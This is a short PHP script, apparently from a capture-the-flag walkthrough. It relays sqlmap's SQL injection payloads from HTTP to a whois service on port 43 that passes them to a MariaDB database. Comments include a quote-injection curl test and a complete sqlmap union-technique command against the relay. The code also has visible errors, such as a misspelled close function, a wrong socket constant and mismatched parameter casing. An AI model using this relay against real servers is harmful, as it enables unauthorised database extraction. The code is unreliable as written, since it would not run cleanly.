<?php

//sqlmap can't do sqli bcoz sqlmap knows HTTP but the sqli is in whois
//The sqli is in whois, In this script we are connecting to whois and run whatever command sqlmap does
//running SQLMAP > sending it to out php script > which then send's it to the whois > which sends to mariadb(Mysql) (that's how the sqli was configured)

//to run this code php -S 127.0.0.1:80
//curl 127.0.0.1/PleaseSubscribe.php?pleaseSubscribe=abc%20abc

//to send it to localhost
$addr = 'localhost'; //change thiis to the whois sever ip
$port = '43';

//create a socket
$sock = socket_create(AF_INET, SOCK_STREAM, SQL_TCP);
$sockconnect = socket_connect($sock, $addr, $port);

//$req = $_REQUEST['PleaseSubscribe']; //always test using this 
$req = urldecode($_REQUEST['PleaseSubscribe']) . "\r\n";//dont need to url decode it does it for us (just a good practice )
                                                        // /r/n bcoz we need to send a line break to the whois server

socket_write($sock, $req, strlen($req));
echo socket_read($sock, 1024, PHP_BINARY_READ); // PHP_NORMAL_READ don't use this as it breaks at line breaks
                                                //THere are 2 modes PHP_NORMAL_READ (this read whole)

sockket_close($sock);

// curl 127.0.0.1/PleaseSubscribe.php?pleaseSubscribe=test\'
// sqlmap --technique=U --dbms=mysql -u http://127.0.0.1/whois_sql.php?PleaseSubscribe=hellow -p PleaseSubscribe 
?>
